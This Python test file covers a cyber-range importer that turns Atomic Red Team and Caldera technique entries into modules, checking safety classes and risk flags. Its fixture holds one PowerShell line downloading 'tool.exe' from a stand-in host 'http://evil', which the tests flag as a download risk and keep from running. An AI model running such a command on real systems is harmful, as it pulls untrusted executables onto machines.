import unittest

from cyberrange import ingest


ATOMIC_DOC = {
    "attack_technique": "T1059.004",
    "display_name": "Unix Shell",
    "atomic_tests": [
        {
            "name": "Harmless echo",
            "auto_generated_guid": "11111111-1111-1111-1111-111111111111",
            "supported_platforms": ["linux"],
            "input_arguments": {"target": {"type": "string", "default": "localhost"}},
            "executor": {"name": "sh", "elevation_required": False,
                         "command": "echo hello from #{target}",
                         "cleanup_command": "echo done"},
        },
        {
            "name": "Download a tool",
            "supported_platforms": ["windows"],
            "executor": {"name": "powershell", "elevation_required": True,
                         "command": "Invoke-WebRequest -Uri http://evil/tool.exe -OutFile t.exe"},
        },
        {
            "name": "Manual step",
            "supported_platforms": ["linux"],
            "executor": {"name": "manual", "command": None},
        },
    ],
}


class IngestTest(unittest.TestCase):
    def setUp(self):
        self.mods = ingest.atomic_doc_to_modules(ATOMIC_DOC)

    def test_manual_and_empty_skipped(self):
        # linux sh + windows powershell convert; manual/no-command is skipped.
        self.assertEqual(len(self.mods), 2)

    def test_everything_imported_is_unsigned(self):
        self.assertTrue(all(m["signed"] is False for m in self.mods))

    def test_technique_collapsed_to_parent(self):
        self.assertTrue(all(m["technique_ids"] == ["T1059"] for m in self.mods))

    def test_linux_shell_gets_real_execution_spec(self):
        linux = next(m for m in self.mods if m["platform"] == "linux")
        self.assertEqual(m_adapter(linux), "docker")
        self.assertEqual(linux["execution"]["cmd"][0], "sh")
        self.assertEqual(linux["safety_class"], "S1")  # benign, no elevation

    def test_windows_recorded_but_not_runnable(self):
        win = next(m for m in self.mods if m["platform"] == "windows")
        self.assertNotIn("execution", win)
        self.assertIn("candidate_command", win["_import"])
        # elevated + download risk -> proposed S2
        self.assertEqual(win["safety_class"], "S2")
        self.assertIn("download", win["_import"]["risk_flags"])

    def test_summary(self):
        s = ingest.import_summary(self.mods)
        self.assertEqual(s["total"], 2)
        self.assertEqual(s["real_capable"], 1)
        self.assertEqual(s["by_platform"], {"linux": 1, "windows": 1})

    def test_caldera_conversion(self):
        doc = [{
            "name": "Ping sweep", "technique_id": "T1018", "ability_id": "abc",
            "executors": [{"name": "sh", "platform": "linux", "command": "ping -c1 10.0.0.1"}],
        }]
        mods = ingest.caldera_doc_to_modules(doc)
        self.assertEqual(len(mods), 1)
        self.assertEqual(mods[0]["technique_ids"], ["T1018"])
        self.assertFalse(mods[0]["signed"])
        self.assertEqual(mods[0]["execution"]["adapter"], "docker")


def m_adapter(mod):
    return (mod.get("execution") or {}).get("adapter")


if __name__ == "__main__":
    unittest.main()
